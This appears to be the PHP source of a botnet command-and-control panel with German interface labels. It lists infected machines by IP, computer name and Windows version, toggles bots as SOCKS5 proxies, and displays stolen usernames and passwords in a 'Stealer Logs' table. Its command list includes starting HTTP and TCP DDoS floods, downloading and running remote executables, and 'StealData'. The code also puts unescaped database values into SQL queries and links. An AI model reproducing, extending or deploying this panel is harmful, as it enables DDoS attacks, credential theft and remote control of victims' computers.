<?php
function safe_sql($value){
   return mysql_real_escape_string($value);
} 

function safe_xss($value){
	return htmlspecialchars($value);
}

function show_NStats(){	  
	//Bots Online
	$query = "SELECT COUNT(*) as Anzahl FROM bots WHERE status = 1";
	$queryerg = mysql_query($query) OR die(mysql_error());
	while($row = mysql_fetch_array($queryerg)){
	  $bot_online = $row[0];
	} 

	//Bots Offline
	$query = "SELECT COUNT(*) as Anzahl FROM bots WHERE status = 0";
	$queryerg = mysql_query($query) OR die(mysql_error());
	while($row = mysql_fetch_array($queryerg)){
	  $bot_offlline = $row[0];
	} 

	//Bots Gesamt
	$query = "SELECT COUNT(*) as Anzahl FROM bots";
	$queryerg = mysql_query($query) OR die(mysql_error());
	while($row = mysql_fetch_array($queryerg)){
	  $bot_gesamt = $row[0];
	} 

	$on  = $bot_online;
	$off = $bot_offlline;
	$all = $bot_gesamt;


	$all2 = '&nbsp;'.$all.'&nbsp;(100%)';


	if($all != 0){
		$on = $on.'&nbsp;('.round($on/$all*100,0).'%)';
	}

	if($all != 0){
		$off = $off.'&nbsp;('.round($off/$all*100,0).'%)';
	}
	
	echo '<div class="right">
			<strong>Alle:</strong> '.$all.'
		    <strong>Online:</strong> '.$on.'
		    <strong>Offline:</strong> '.$off.'
		  </div>';
}

function show_countrys(){
include('inc/code2country.php');

echo '<script type="text/javascript">
		  var data = {
					items: [';
					
						$query1 = mysql_query("SELECT * FROM bots");					
						$alle = mysql_num_rows($query1);
						
						$query2 = mysql_query("SELECT * FROM bots GROUP BY country HAVING count(country) >= 1");
						while($row = mysql_fetch_array($query2)){
							$vic = $row['country'];
							
							$query3 = mysql_query("SELECT * FROM bots WHERE country = '$vic'");
							
							$zahl = mysql_num_rows($query3);
							$total  = $zahl/$alle*100;
							
							//echo "['".$ccode[strtoupper($vic)]." [".$zahl." Bots]', ".round($total, 1)."],\r\n";
							echo "{label: '<img src=\"img/".$vic.".gif\" style=\"float: left;\"><span style=\"float: left; margin-left: 5px;\">".$ccode[strtoupper($vic)]." (".round($total, 1)."%)</span>', data: 12015},";
						}
					
						   
						   
echo '					   ]
					};

		  // FLOT
		  jQuery(function () {
		    jQuery.plot(jQuery("#flotExample"), data.items, {
				pie: { 
					show: true, 
					pieStrokeLineWidth: 1, 
					pieStrokeColor: \'#FFF\', 
					//pieChartRadius: 100, 			// by default it calculated by 
					//centerOffsetTop:30,
					//centerOffsetLeft:30, 			// if \'auto\' and legend position is "nw" then centerOffsetLeft is equal a width of legend.
					showLabel: false,				//use ".pieLabel div" to format looks of labels
					labelOffsetFactor: 4/6, 		// part of radius (default 5/6)
					//labelOffset: 0        		// offset in pixels if > 0 then labelOffsetFactor is ignored
					labelBackgroundOpacity: 0.55, 	// default is 0.85
					labelFormatter: function(serie){// default formatter is "serie.label"
					return serie.label+\'<br/>\'+Math.round(serie.percent)+\'%\';
					}
				},
				legend: {
					show: true, 
					position: "ne", 
					backgroundOpacity: 0
				}
			})
		  });
		</script>';
}

function show_tasks(){
	echo '<div id="tasks">
		  <h3>Aufgaben</h3>
		  <table>
		  <tr>
			<th>Command</th>
			<th>Countrys</th>
			<th>CMD Free</th>
			<th>Bots/Done</th>
			<th>OK</th>
			<th>Delete</th>
		  </tr>';
		  
		$query1 = mysql_query("SELECT * FROM tasks");
		while($row = mysql_fetch_array($query1))
		{
		  $split = explode(',', safe_xss($row['countries']));
		  
		  echo '<tr>
				  <td style="text-align: left;">'.safe_xss($row['command']).'</td>
		        <td>';	
				
				if(empty($split[0])){
					echo '<img src="img/00.gif" /> (All)';
				}else{					
					for($i = 0; $i <= 4; $i++){
						echo '<img src="img/'.$split[$i].'.gif" />&nbsp;';
					}
					if(!empty($split[5])){
						echo ' ... [<a href="" onClick="javascript:popUp(\'other/showall.php?id='.safe_xss($row['id']).'\')">show all</a>]';
					}
				}
		  
		  echo '</td>
				<td>'.safe_xss($row['time']).'</td>';
		  
		  
		  if(safe_xss($row['bots']) == safe_xss($row['done'])){
			echo '<td style="background-color: #ABC886">'.safe_xss($row['bots']).' / '.safe_xss($row['done']).'</td>';
		  }else{
			echo '<td style="background-color: #FFC2C2;">'.safe_xss($row['bots']).' / '.safe_xss($row['done']).'</td>';
		  }
		  
		  echo '<td style="">'.percent(safe_xss($row['done']),safe_xss($row['bots'])).'%</div></td>';
		  
		  if(safe_xss($row['bots']) != safe_xss($row['done'])){
			echo '<td style=""><a href="index.php?cmd='.safe_xss($row['command']).'" onClick="javascript:return(confirm(\'bots != done\nTask '.safe_xss($row['id']).' delete now?\'))"><b style="color: red;"><img src="img/del.png" /></b></a></td>';
		  }else{
			echo '<td style=""><a href="index.php?cmd='.safe_xss($row['command']).'" onClick="javascript:return(confirm(\'Task '.safe_xss($row['id']).' delete now?\'))"><b style="color: red;"><img src="img/del.png" /></b></a></td>';
		  }
		  
		  echo '</tr>';
		}
		  
	echo '</table></div>';
	
	//Del tasks / Add new
	echo '<br />
			<form action="index.php?id=tasks&deletetasks" method="get">
				<input type="radio" name="del" value="1" />All finished Tasks &nbsp;<b>OR</b>&nbsp;<input type="radio" name="del" value="2" />All Tasks &nbsp;<input type="submit" name="deletetasks" class="btn" value="Delete" />
			</form>	  
			<br />
			
			<div class="hervor" style="padding: 10px;">
			<form action="index.php" method="post">
				Command: <br /><input id="cmd" type="text" class="tb" name="cmd" style="width: 98%;" /> <br />
				Count: <br /><input id="count" type="text" class="tb" name="count" style="width: 10%;" /> <br />
				Execute: <br /><input id="execute" type="text" class="tb" name="execute" value="'.date('Y-m-d H:i:s').'" style="width: 30%;" /> <br /><br />
				
				<input type="submit" name="addcmd" class="btn" value="Befehl absenden!" />
			</form>
			</div>
			
			<h3>Befehle</h3>
			
			<ul>
				<li>StartHTTP*seite*port*threads*sockets*sleeptime</li>
				<li>StartTCP*ip*port*threads*sockets*sleeptime</li>
				<li>StopHTTPDDoS</li>
				<li>StopTCPDDoS</li>
				<li>StopDDoS</li>
				<li>DownloadEx*http://www.server.ch/abc.exe*exename</li>
				<li>StealData</li>
			</ul>
		  ';
}

function show_bots(){
include('inc/p.class.php');
include('inc/config.php');
include('inc/code2country.php');

$time_now = date('Y-m-d H:i:s');

echo '<h3>Deine Bots</h3>
	 <div id="nopie">
	 <table style="width: 100%;">
	  <tr>
		<th>ID</th>
		<th>Land</th>
		<th>IP Adresse</th>
		<th>Lokale IP</th>
		<th>Computer</th>
		<th>Windows Version</th>
		<th>Status</th>
		<th>Socks5 m&ouml;glich?</th>
	  </tr>';

$query1 = mysql_query("SELECT COUNT(*) FROM bots");
$item_count = mysql_result($query1, 0);
$nav = new PageNavigation($item_count, 20);
$query1 = mysql_query("SELECT * FROM bots ORDER BY id ASC LIMIT ".safe_sql($nav->sql_limit));
$item_number = $nav->first_item_id;

  //$query1 = mysql_query("SELECT * FROM bots");
while($row = mysql_fetch_array($query1)){
  $hwid	 = safe_xss($row['hwid']);
  $status = safe_xss($row['status']);
	  
	echo '<tr>
	  <td style="">'.safe_xss($row['id']).'</td>';
		if(empty($row['country'])){
			echo '<td style=""><img src="img/00.gif" /></td>';
		}else{
			echo '<td style=""><img src="img/'.safe_xss($row['country']).'.gif" style="float: left;" /><span style="float: left; margin-left: 5px;">'.$ccode[strtoupper(safe_xss($row['country']))].'</span></td>';
		}
					
	echo  '
	   <td style="">'.safe_xss($row['ip']).'</td>
	   <td style="">'.safe_xss($row['localip']).'</td>
	   <td style="">'.safe_xss($row['pc']).'</td>
	   <td style="">'.safe_xss($row['winver']).'</td>';
	
	if($status == '1'){
		echo '<td style="color: green;">Online</td>';
	}else{
		echo '<td style="color: red;">Offline</td>';
	}
	
	if($row['ip'] == $row['localip']){
		if(safe_xss($row['socksaktiv']) == '1'){
		  echo '<td><img src="img/tick.png" /> (<a href="index.php?socks=deactive&hwid='.$row['hwid'].'&status='.$row['status'].'">Deaktivieren</a>)</td>';
		}else{
		  echo '<td><img src="img/tick.png" /> (<a href="index.php?socks=active&hwid='.$row['hwid'].'&status='.$row['status'].'">Aktivieren</a>)</td>';
		}
	}else{
		echo '<td><img src="img/cross.png" /></td>';
	}
}
	  
echo '</table></div><br /><div style="float: right; font-size: 11px;">'.$nav->createPageBar().'</div><br />';  

$query = "UPDATE bots SET status = 0 WHERE DATE_SUB('$time_now', INTERVAL ".$seconds." SECOND) > time";
    mysql_query($query) OR die(mysql_error());
}

function show_logs(){
include('inc/p2.class.php');

echo '<h3>Stealer Logs</h3>
	 <table style="width: 100%;">
	  <tr>
		<th>ID</th>
		<th>Programm</th>
		<th>URL</th>
		<th>Username</th>
		<th>Passwort</th>
		<th>L&ouml;schen</th>
	  </tr>';
	
$query1 = mysql_query("SELECT COUNT(*) FROM logs");
$item_count = mysql_result($query1, 0);
$nav = new PageNavigation($item_count, 35);
$query1 = mysql_query("SELECT * FROM logs ORDER BY id ASC LIMIT ".safe_sql($nav->sql_limit));
$item_number = $nav->first_item_id;
	
while($row = mysql_fetch_array($query1)){
  echo '<tr>
			<td>'.safe_xss($row['id']).'</td>
			<td>'.safe_xss($row['programm']).'</td>
			<td>'.safe_xss($row['url']).'</td>
			<td>'.safe_xss($row['user']).'</td>
			<td>'.safe_xss($row['pass']).'</td>
			<td><a href="index.php?dellog='.$row['id'].'"><img src="img/del.png" /></a></td>
		</tr>';
}

echo '</table><br /><div style="float: right; font-size: 11px;">'.$nav->createPageBar().'</div><br />';  
}

function percent($done,$bots){
	return round($done / $bots * 100,2);
}
?>